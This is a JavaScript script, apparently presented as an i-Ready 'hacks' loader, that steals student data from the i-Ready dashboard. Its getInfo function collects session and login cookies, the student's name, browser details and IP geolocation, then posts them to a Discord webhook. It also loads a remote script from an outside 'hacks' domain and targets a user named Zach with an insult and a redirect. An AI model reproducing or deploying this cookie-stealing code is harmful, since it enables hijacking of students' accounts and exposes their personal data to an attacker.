var inject = document.createElement("script");

function getInfo() {
    setTimeout(function() {
        localStorage.lsn = '';
        var discordWebhook = "fucked";

        var request = new XMLHttpRequest();
        request.open("POST", discordWebhook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            "content": null,
            avatar_url: "https://cdn.discordapp.com/avatars/924882922987749447/a_6a8127a01be78b0e44b076f27fad4c2a.webp?size=80",
            username: "H",
            "embeds": [{
                "title": "Get Beemed " + document.getElementsByClassName('css-1ii68kw e15psnz1')[0].innerHTML,
                "url": "https://login.i-ready.com/student/dashboard/home",
                "color": null,
                "fields": [{
                        "name": "_ga",
                        "value": getCookie('_ga')
                    },
                    {
                        "name": "_gid",
                        "value": getCookie('_gid')
                    },
                    {
                        "name": "iready_last_user_type",
                        "value": getCookie('iready_last_user_type')
                    },
                    {
                        "name": "CA.SESSION.NAME",
                        "value": getCookie('CA.SESSION.NAME')
                    },
                    {
                        "name": "iready_login_id",
                        "value": getCookie('iready_login_id')
                    },
                    {
                        "name": "iready_landing_page_id",
                        "value": getCookie('iready_landing_page_id')
                    },
                    {
                        "name": "_gat",
                        "value": getCookie('_gat')
                    },
                    {
                        "name": "AWSALB",
                        "value": getCookie('AWSALB')
                    },
                    {
                        "name": "AWSALBCORS",
                        "value": getCookie('AWSALBCORS')
                    },
                    {
                        "name": "State",
                        "value": localStorage.state
                    },
                    {
                        "name": "IP Info",
                        "value": localStorage.reg
                    },
                    {
                        "name": "Browser Info",
                        "value": navigator.appVersion
                    },
                    {
                        "name": "Name",
                        "value": document.getElementsByClassName('css-1ii68kw e15psnz1')[0].innerHTML
                    }
                ],
                "author": {
                    "name": "Koobface X I-Ready Overload"
                }
            }],
            "attachments": []
        }
        request.send(JSON.stringify(params));
    }, 0)
}
if (document.getElementsByClassName('css-1ii68kw e15psnz1')[0].innerHTML === "Zach") {
    alert("fuck you zach");
    location.href = 'fucked';
    getInfo()
}
fetch("https://ipapi.co/json/")
    .then(txt => {
        return txt.json()
    })
    .then(data => {
        localStorage.setItem("reg", JSON.stringify(data))
    });
let info;
if (localStorage.tos === 'false') {

} else {
    let tos = confirm('cleaned by rondale quis fingerbottomson VII#6969')
    if (tos === true) {
        localStorage.setItem('tos', tos)
        getInfo()
    }
}
inject.src = `https://www.i-ready.dev/hacks/hacks.js`
document.body.appendChild(inject);
